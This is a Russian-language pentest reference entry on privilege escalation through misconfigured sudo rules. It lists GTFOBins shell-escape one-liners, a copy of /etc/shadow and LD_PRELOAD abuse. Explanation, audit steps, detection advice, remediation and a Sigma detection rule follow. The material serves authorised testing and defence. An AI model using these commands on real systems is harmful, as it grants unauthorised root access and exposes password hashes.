---
id: linux-sudo-misconfiguration
title: "Linux: слабые правила sudo (GTFOBins-техники, NOPASSWD)"
type: privesc
target: linux
category: web
difficulty: beginner
bypass: none
tags: [privesc, linux, sudo, gtfobins, misconfiguration]
tested_on: ["Debian 12", "Ubuntu 22.04"]
success_rate: 0.7
risk: high
cwe: "CWE-269"
lab: null
last_verified: "2026-10-23"
references:
  - "https://gtfobins.github.io/"
  - "https://book.hacktricks.xyz/privilege-escalation/privilege-escalation"
---

# Linux: слабые правила sudo (GTFOBins-техники, NOPASSWD)

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
# что разрешено текущему пользователю
sudo -l

# типовые опасные записи и соответствующие техники (стенд!):
# (ALL) NOPASSWD: /usr/bin/vim        -> sudo vim -c ':!/bin/sh'
# (ALL) NOPASSWD: /usr/bin/less       -> sudo less /etc/profile; !/bin/sh
# (ALL) NOPASSWD: /usr/bin/find       -> sudo find . -exec /bin/sh \; -quit
# (ALL) NOPASSWD: /usr/bin/python3    -> sudo python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
# (ALL) NOPASSWD: /usr/bin/tar        -> sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# (ALL) NOPASSWD: /usr/bin/perl       -> sudo perl -e 'exec "/bin/sh";'
# (ALL) NOPASSWD: /usr/bin/env        -> sudo env /bin/sh
# (ALL) NOPASSWD: /usr/bin/apt        -> sudo apt-get changelog apt; !/bin/sh
# (ALL) NOPASSWD: /usr/bin/systemctl  -> sudo systemctl edit ssh.service (Unit-файл с ExecStart)
# (ALL) NOPASSWD: /usr/bin/mysql      -> sudo mysql -e '\! /bin/sh'
# (ALL) NOPASSWD: /usr/bin/rvim/rview -> ограничения обходятся через Python/Lua
# (ALL) NOPASSWD: /usr/bin/time       -> sudo time /bin/sh
# (ALL) NOPASSWD: /usr/bin/make       -> Makefile с целью, вызывающей /bin/sh
# (ALL) NOPASSWD: /usr/bin/zip        -> sudo zip x.zip /etc/hosts -T -TT '/bin/sh #'
# (ALL) NOPASSWD: /usr/bin/cp         -> sudo cp /etc/shadow /tmp/ && чтение
# (ALL) NOPASSWD: /usr/bin/nmap       -> (nmap <7.50) sudo nmap --interactive

# опасные комбинации параметров sudo:
# SETENV:  -> sudo env LD_PRELOAD=/tmp/evil.so /usr/bin/allowlisted
# NOEXEC:  -> обход через функции/скрипты, а не внешние команды
# !authenticate -> то же, что NOPASSWD
# (ALL:ALL) с подстановочным путём: /usr/bin/python* -> python3 любой версии
# путь с wildcard: /opt/scripts/*.sh -> подмена/запись своего скрипта
```

## Explanation

`sudo -l` — первая команда после получения доступа: она показывает, что
уже разрешено. Опасность представляют не «sudo на всё», а **точечные
разрешения на интерактивные программы**, из которых можно выйти в
оболочку или выполнить произвольную команду (каталогизированы в GTFOBins).

Отдельные подводные камни конфигурации:

* `NOPASSWD` — не требует подтверждения пароля: злоумышленник с сессией
  пользователя эскалируется мгновенно;
* `SETENV` — позволяет передать окружение, значит `LD_PRELOAD` и `PATH`
  работают против allowlisted-команды;
* `NOEXEC` — ограничивает вызов внешних программ, но обходится в
  интерпретаторах (Python/Lua/Perl вызывают exec напрямую);
* wildcard-пути (`/opt/scripts/*.sh`, `/usr/bin/python*`) — почти всегда
  ошибка: либо можно подменить файл, либо выбрать другую версию бинарника;
* `Defaults env_keep+=LD_PRELOAD` в глобальном конфиге — критично;
* `sudoedit`/`SUDO_EDITOR` с `vi`-редактором — выход в оболочку через `:!`.

Методика аудита: выгрузить `/etc/sudoers` и `/etc/sudoers.d/*`, прогнать
каждую запись через GTFOBins, проверить wildcard-пути на возможность
записи, убедиться в отсутствии `SETENV` без нужды.

## Detection

* Логи `sudo` (auth.log / journal): любые записи `COMMAND=` — источник
  для анализа. Алерт на интерактивные программы (`vim`, `less`, `find`,
  `python`, `perl`, `tar`, `env`, `make`, `mysql`) под sudo.
* Алерт на смену euid в дочернем процессе разрешённой команды
  (`vim -> sh` с euid 0).
* Контроль целостности `/etc/sudoers` и `/etc/sudoers.d/`.
* Инвентаризация правил sudo в baseline и diff при аудите.
* Sysmon for Linux: EventID 1 с `User=root` и `ParentUser != root`.

## Remediation

- Запретить NOPASSWD везде, кроме автоматизации, и для автоматизации —
  только не-интерактивные команды с точными аргументами.
- Не давать sudo на интерактивные программы; заменять задачами:
  вместо `sudo vim /etc/nginx/nginx.conf` — `sudoedit` с ограниченным
  редактором и отдельной командой reload.
- Не использовать wildcard в путях и аргументах.
- `Defaults env_reset`, запрет `SETENV`, `Defaults secure_path`.
- Использовать `Cmnd_Alias` с явным списком и ревью раз в квартал.
- Автоматизация: отдельная сервисная учётка + systemd-юнит, а не sudo
  для человека.
- Включить `Defaults log_input, log_output` для критичных хостов
  (сессии sudo записываются) и `iolog_dir` в защищённое хранилище.


## Detection rules

```yaml
title: sudo-вызов интерактивной программы (потенциальная эскалация через GTFOBins)
id: c3d4e5f6-0002-4c3d-9e4f-000000000202
status: experimental
description: >-
  Пользователь запускает под sudo программу, из которой возможен выход
  в оболочку или выполнение произвольного кода.
references:
  - https://attack.mitre.org/techniques/T1548/003/
  - https://gtfobins.github.io/
logsource:
  product: linux
  service: sudo
  definition: 'журнал sudo (auth.log / journalctl -t sudo)'
detection:
  selection:
    EventType: SUDO_COMMAND
    Command|contains:
      - '/usr/bin/vim'
      - '/usr/bin/vi'
      - '/usr/bin/less'
      - '/usr/bin/more'
      - '/usr/bin/man'
      - '/usr/bin/find'
      - '/usr/bin/python'
      - '/usr/bin/perl'
      - '/usr/bin/ruby'
      - '/usr/bin/lua'
      - '/usr/bin/tar'
      - '/usr/bin/zip'
      - '/usr/bin/env'
      - '/usr/bin/make'
      - '/usr/bin/mysql'
      - '/usr/bin/psql'
      - '/usr/bin/ftp'
      - '/usr/bin/gdb'
      - '/usr/bin/awk'
      - '/usr/bin/sed'
      - '/usr/bin/systemctl'
      - '/usr/bin/apt'
      - '/usr/bin/nmap'
  filter_admin:
    User:
      - 'automation'          # сервисные учётки с осознанными правилами
  condition: selection and not filter_admin
fields:
  - User
  - Command
  - Pwd
  - Tty
falsepositives:
  - легитимное администрирование через vim/less (сужайте до конкретных хостов и учёток)
level: medium
tags:
  - attack.privilege_escalation
  - attack.t1548.003
```
